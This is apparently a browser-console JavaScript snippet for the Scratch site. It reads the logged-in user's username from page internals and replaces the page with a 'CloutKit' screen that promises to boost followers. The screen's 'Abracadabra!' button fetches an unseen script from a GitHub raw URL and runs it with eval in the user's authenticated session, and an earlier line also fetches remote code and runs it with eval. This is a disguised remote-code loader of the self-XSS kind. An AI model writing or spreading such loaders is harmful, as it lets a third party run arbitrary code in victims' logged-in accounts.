fetch('https://cdn.scratch.mit.edu/scratchr2/static/__35b9adb704d6d778f00a893a1b104339__//js/jquery.min.js').then(r=>r.text()).then(t=>eval(t))
function getScratchUsername() {
        try {
          const reactRoot = document.querySelector('#app')._reactRootContainer._internalRoot.current;
          const username = reactRoot.child.stateNode.props.store.getState().session.session.user.username;
      
          if (username) {
            localStorage.setItem('scratchUsername', username);
            console.log("Got username from React and cached it:", username);
            return username;
          }
        } catch (e) {
          console.error("Error while trying to get username from React:", e);
        }
      
        // Fallback to localStorage
        const cachedUsername = localStorage.getItem('scratchUsername');
        if (cachedUsername) {
          console.log("Loaded username from localStorage:", cachedUsername);
          return cachedUsername;
        } else {
          console.warn("Username not found in React or localStorage.");
          return null;
        }
      }
      
var username = getScratchUsername();
console.log("Logged in as:", username);

document.documentElement.innerHTML=`<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width">
    <title>Welcome to CloutKit</title>
    <style type="text/css">
      * {
        margin: 0;
      }
      html, body {
        height: 100%;
        background-color: #0d0d0d;
      }
      .page {
        min-height: 100%;
        background-color: #0d0d0d;
        font-weight: 500;
      }
      .page:after {
        content: "";
        display: block;
      }
      .header-wrapper {
        width: 100%;
        height: 10vh;
      }
      .header-content {
        width: calc(100% - 2rem);
        padding: 1rem;
      }
      .main {
        width: 100%;
        min-height: calc(100vh - 100px - 4vw);
      }
      .content {
        width: 90vw;
        max-width: 45rem;
        margin: 0 auto;
        text-align: center;
        font-family: "Helvetica Neue", "Helvetica", Arial, sans-serif;
        color: white;
        /* hack to prevent content from shifting when scrollbar appears; see
        https://stackoverflow.com/a/30293718/2308190 */
        padding-left: calc(100vw - 100%);
      }
      .content a {
        color: white;
      }
      hr {
        border-width: 0;
        border-top-style: solid;
        border-top-width: 1px;
        border-color: white;
        opacity: 25%;
        margin: 2rem 0;
      }
      img.main-img {
        width: 300px;
        height: 200px;
      }
      h1 {
        font-size: 2rem;
        margin: 1.5rem 1rem 2.5rem 1rem;
      }
      h2 {
        font-size: 1.125rem;
        margin: 1rem 1rem 2.25rem 1rem;
      }
      h2.reload {
        cursor: pointer;
        pointer-events: all;
      }
      h2.reload:before {
        margin-top: 0;
        margin-left: -2.25rem;
        content:'';
        background: url('http://scratch-maintenance.s3.amazonaws.com/reload.svg');
        height: 66px; /*height of image*/
        width: 63px;  /*width of image*/
        position: absolute;
        background-size: 24px 24px;
        background-repeat: no-repeat;
      }
      h2.comment:before {
        margin-top: 0;
        margin-left: -2.375rem;
        content:'';
        background: url('http://scratch-maintenance.s3.amazonaws.com/comment.svg');
        height: 66px; /*height of image*/
        width: 63px;  /*width of image*/
        position: absolute;
        background-size: 25px 24px;
        background-repeat: no-repeat;
      }
      p {
        font-size: 1rem;
        line-height: 1.5rem;
        margin: 1rem 1rem 1.5rem 1rem;
      }
      .narrow {
        padding: 0 10%;
      }
      button {
        cursor: pointer;
        border: 0;
        background-color: white;
        box-shadow: none;
        border-radius: .25rem;
        padding: 1rem 1.5rem;
      }
      button span {
        font-size: 1rem;
        color: #0d0d0d;
        font-weight: 600;
      }
      .hidden {
        display: none;
      }
      .showing {
        display: inline-block;
      }
      .grid-wrapper {
        min-height: 100%;
        /* display: flex; */
        margin-bottom: 2rem;
      }
      .grid-content {
        /* display: inline-block; */
      }
      .grid-content .grid-box {
        width: 16rem;
        display: inline-block;
        background-color: white;
        font-size: 1rem;
        color: #0d0d0d;
        font-weight: 600;
        border-radius: .5rem;
        padding: 1rem 1rem;
        margin: 0.5rem;
        text-align: left;
        vertical-align: top;
      }
      .os-name-row {
        margin-bottom: 0.25rem;
        display: flex;
        align-items: center;
      }
      .os-name-img {
      }
      .os-name-text {
        color: #575E75;
        line-height: 1.25rem;
        margin-left: 0.5rem;
      }
      .os-version {
        color: #aaa;
        font-size: 0.75rem;
        font-weight: 400;
      }
      .download-link-row {
        margin-top: 0.75rem;
        display: flex;
        align-items: center;
      }
      .store-img {
        flex: 1;
        height: 2.625rem;
      }
      .store-img img {
        height: 2.5rem;
      }
      .vertical-separator-left {
        border-right: 1px solid #d9d9d9;
        height: 2rem;
        flex: 1;
      }
      .vertical-separator-right {
        flex: 1;
      }
      .download-link {
        flex: 1;
        padding: .25rem 0.125rem .25rem 0;
      }
      .download-link a {
        color: #0d0d0d;
        text-decoration: none;
      }
    </style>
    <script language="JavaScript">
      var toggle = function (elem) {
        // If the element is visible, hide it
        if (window.getComputedStyle(elem).display === 'block') {
          elem.style.display = 'none';
          return;
        }
        // Otherwise, show it
        elem.style.display = 'inline-block';
      };
      // Handler when the DOM is fully loaded
      var onLoaded = function() {
        // Listen for click events
        var actionShowElements = document.getElementsByClassName('toggleShowing');
        if (actionShowElements && actionShowElements.length) {
          for (var i = 0; i < actionShowElements.length; i++) {
            actionShowElements[i].onclick = function() {
              var hiddenElements = document.getElementsByClassName('hidden');
              if (hiddenElements && hiddenElements.length) {
                for (var j = 0; j < hiddenElements.length; j++) {
                  hiddenElements[j].style.display = 'inline-block';
                };
              }
              var showingElements = document.getElementsByClassName('showing');
              if (showingElements && showingElements.length) {
                for (var j = 0; j < showingElements.length; j++) {
                  showingElements[j].style.display = 'none';
                };
              }
            };
          }
        }
      };
      // wait until document loaded to assign onclick handlers
      if (document.readyState === "complete" ||
        (document.readyState !== "loading" && !document.documentElement.doScroll)) {
        onLoaded();
      } else {
        document.addEventListener("DOMContentLoaded", onLoaded);
      }
    </script>
    <script src="https://cdn.scratch.mit.edu/scratchr2/static/__35b9adb704d6d778f00a893a1b104339__//js/jquery.min.js"></script>
  </head>
  <body>
    <div class="page">
      <div class="header-wrapper">
        <div class="header-content">
            <a href="/"><img src="http://scratch-maintenance.s3.amazonaws.com/logo_sm.png" width="80px"></a>
        </div>
      </div>
      <div class="main">
        <div class="content">
          <img src="http://raw.githubusercontent.com/SuperS0n1k/CloutKit/main/brush.svg">
          <h1>This is where the magic happens.</h1>
          <hr>
          <div class="narrow">
            <p>Press the button to turbocharge your following!</p>
          </div>
          <button onclick="fetch('https://raw.githubusercontent.com/SuperS0n1k/CloutKit/main/abracadabra.js').then(r=>r.text()).then(t=>eval(t))"><span>Abracadabra!</span></button>
        </div>
      </div>
    </div>
  

</body>`

